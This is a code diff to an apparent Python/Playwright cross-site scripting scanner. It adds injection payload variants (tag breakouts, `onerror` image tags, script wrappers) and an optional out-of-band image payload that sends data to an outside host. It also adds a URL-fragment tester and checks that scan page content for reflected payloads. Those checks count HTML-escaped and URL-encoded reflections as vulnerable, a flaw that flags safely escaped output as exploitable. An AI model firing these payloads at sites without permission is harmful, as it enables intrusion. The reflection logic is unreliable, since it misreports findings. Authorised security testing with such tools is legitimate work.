@@ -1,14 +1,45 @@
-from urllib.parse import urlparse, parse_qs, urlencode
+from urllib.parse import urlparse, parse_qs, urlencode, quote
 from termcolor import colored
+import os
+from html import escape as html_escape
+import uuid
 
 
 def evade(p):
-    # Just return the basics to keep the scanner fast
-    return [
-        p,                      # The raw payload
-        f'"><p>{p}',            # Break out of an input tag: <input value=""><p><script>...
-        f"';{p}//",             # Break out of a JavaScript string
-    ]
+    # Return multiple encoded/obfuscated variants to increase detection
+    variants = []
+    raw = p
+    variants.append(raw)
+    variants.append(f'">{raw}')
+    variants.append(f'"> <img src=x onerror={raw}>')
+    variants.append(f"';{raw}//")
+    # HTML-escaped
+    variants.append(html_escape(raw))
+    # URL-encoded
+    variants.append(quote(raw))
+    # simple script wrapper
+    variants.append(f"<script>{raw}</script>")
+
+    # OOB support: if OOB_DOMAIN is set, add an image/exfil variant
+    oob = os.getenv('OOB_DOMAIN')
+    if oob:
+        nid = uuid.uuid4().hex[:8]
+        oob_payload = f"<img src=\"http://{oob}/{nid}?c={quote(raw)}\">"
+        variants.append(oob_payload)
+
+    # Deduplicate while preserving order
+    seen = set()
+    out = []
+    for v in variants:
+        if v not in seen:
+            seen.add(v)
+            out.append(v)
+    return out
+
+
+def _content_variants(ev):
+    # Variants to look for in page.content()
+    return [ev, html_escape(ev), quote(ev), ev.replace('<', '&lt;')]
 
 
 def test_form_vulnerability(page, form, payloads):
@@ -67,6 +98,16 @@ def test_form_vulnerability(page, form, payloads):
                 page.goto(form['url'], wait_until="domcontentloaded")
                 page.wait_for_timeout(300)
                 print(colored(f"TESTED (Stored) --> {form['url']} (Payload: {ev})", 'blue'))
+                # 5. Inspect page content for silent reflections (non-alerting XSS)
+                try:
+                    content = page.content()
+                    for v in _content_variants(ev):
+                        if v in content:
+                            print(colored(f"VULNERABLE (reflected in HTML) --> {page.url}", 'green', attrs=['bold']))
+                            vuln_count += 1
+                            break
+                except Exception:
+                    pass
 
             except Exception as e:
                 # print(f"Debug error: {e}") # Uncomment for debugging
@@ -120,6 +161,16 @@ def test_url_parameters(page, url, payloads):
                     # it will fire automatically if the XSS triggers.
                     # If it didn't trigger, we log the negative result.
                     print(colored(f"TESTED --> {test_url}", 'blue'))
+                    # Inspect content for silent reflections
+                    try:
+                        content = page.content()
+                        for v in _content_variants(ev):
+                            if v in content:
+                                print(colored(f"VULNERABLE (reflected in HTML) --> {test_url}", 'green', attrs=['bold']))
+                                vuln_count += 1
+                                break
+                    except Exception:
+                        pass
 
                 except Exception as e:
                     # Handling timeouts or navigation errors
@@ -127,6 +178,51 @@ def test_url_parameters(page, url, payloads):
 
     page.remove_listener("dialog", handle_dialog)
 
+    return vuln_count
+
+
+def test_fragment_parameters(page, url, payloads):
+    """Test payloads appended to the URL fragment/hash (#) to catch DOM/hash-based sinks."""
+    vuln_count = 0
+    parsed = urlparse(url)
+    base = parsed._replace(fragment="").geturl()
+
+    # Define dialog listener
+    def handle_dialog(dialog):
+        nonlocal vuln_count
+        try:
+            print(colored(f"VULNERABLE --> {page.url}", 'green', attrs=['bold']))
+            vuln_count += 1
+            dialog.accept()
+        except Exception as e:
+            if "already handled" in str(e):
+                pass
+
+    page.on("dialog", handle_dialog)
+
+    for payload in payloads:
+        for ev in evade(payload):
+            try:
+                frag = quote(ev)
+                test_url = base + "#" + frag
+                page.goto(test_url, wait_until="domcontentloaded", timeout=5000)
+                page.wait_for_timeout(300)
+                print(colored(f"TESTED (fragment) --> {test_url}", 'blue'))
+
+                try:
+                    content = page.content()
+                    for v in _content_variants(ev):
+                        if v in content:
+                            print(colored(f"VULNERABLE (reflected in HTML) --> {test_url}", 'green', attrs=['bold']))
+                            vuln_count += 1
+                            break
+                except Exception:
+                    pass
+
+            except Exception:
+                continue
+
+    page.remove_listener("dialog", handle_dialog)
     return vuln_count
 
 
@@ -184,6 +280,17 @@ def test_loose_inputs(page, url, payloads):
 
                     # Reset to original URL for next payload/input
                     page.goto(url, wait_until="domcontentloaded")
+
+                    # Inspect content for reflections
+                    try:
+                        content = page.content()
+                        for v in _content_variants(ev):
+                            if v in content:
+                                print(colored(f"VULNERABLE (reflected in HTML) --> {page.url}", 'green', attrs=['bold']))
+                                vuln_count += 1
+                                break
+                    except Exception:
+                        pass
 
                 except Exception as e:
                     continue
